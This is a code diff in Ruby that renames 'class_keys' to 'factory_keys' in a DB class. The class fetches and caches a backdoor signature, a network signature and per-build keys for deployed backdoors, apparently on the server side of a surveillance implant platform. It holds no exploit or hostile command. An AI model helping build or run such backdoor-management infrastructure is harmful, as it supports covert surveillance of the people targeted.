@@ -49,7 +49,7 @@ class DB
     # signature for the network elements
     @network_signature = nil
     # class keys
-    @class_keys = {}
+    @factory_keys = {}
     
     # the current db layer REST
     @db_rest = DB_rest.new @host
@@ -116,8 +116,8 @@ class DB
       @network_signature = net_sig unless net_sig.nil?
 
       # get the classkey of every backdoor
-      keys = db_rest_call :class_keys
-      @class_keys = keys unless keys.nil?
+      keys = db_rest_call :factory_keys
+      @factory_keys = keys unless keys.nil?
 
       # errors while retrieving the data from the db
       return false if bck_sig.nil? or keys.nil? or net_sig.nil?
@@ -132,8 +132,8 @@ class DB
       trace :info, "Backdoor signature saved in the DB cache"
       DBCache.network_signature = net_sig
       trace :info, "Network signature saved in the DB cache"
-      DBCache.add_class_keys @class_keys
-      trace :info, "#{@class_keys.length} entries saved in the the DB cache"
+      DBCache.add_factory_keys @factory_keys
+      trace :info, "#{@factory_keys.length} entries saved in the the DB cache"
 
       return true
     end
@@ -146,9 +146,9 @@ class DB
       # populate the memory cache from the permanent one
       @backdoor_signature = Digest::MD5.digest DBCache.backdoor_signature unless DBCache.backdoor_signature.nil?
       @network_signature = DBCache.network_signature unless DBCache.network_signature.nil?
-      @class_keys = DBCache.class_keys
+      @factory_keys = DBCache.factory_keys
 
-      trace :info, "#{@class_keys.length} entries loaded from DB cache"
+      trace :info, "#{@factory_keys.length} entries loaded from DB cache"
 
       return true
     end
@@ -164,28 +164,28 @@ class DB
     db_rest_call :status_update, component, ip, status, message, stats[:disk], stats[:cpu], stats[:pcpu]
   end
 
-  def class_key_of(build_id)
+  def factory_key_of(build_id)
     # if we already have it return otherwise we have to ask to the db
-    return Digest::MD5.digest @class_keys[build_id] unless @class_keys[build_id].nil?
+    return Digest::MD5.digest @factory_keys[build_id] unless @factory_keys[build_id].nil?
 
-    trace :debug, "Cache Miss: class key for #{build_id}"
+    trace :debug, "Cache Miss: factory key for #{build_id}"
 
     return nil unless @available
     
-    # ask to the db the class key
-    key = db_rest_call :class_keys, build_id
+    # ask to the db the factory key
+    key = db_rest_call :factory_keys, build_id
 
-    # save the class key in the cache (memory and permanent)
+    # save the factory key in the cache (memory and permanent)
     if not key.nil? and not key.empty? then
-      @class_keys[build_id] = key
+      @factory_keys[build_id] = key
 
       # store it in the permanent cache
       entry = {}
       entry[build_id] = key
-      DBCache.add_class_keys entry
+      DBCache.add_factory_keys entry
 
       # return the key
-      return Digest::MD5.digest @class_keys[build_id]
+      return Digest::MD5.digest @factory_keys[build_id]
     end
 
     # key not found
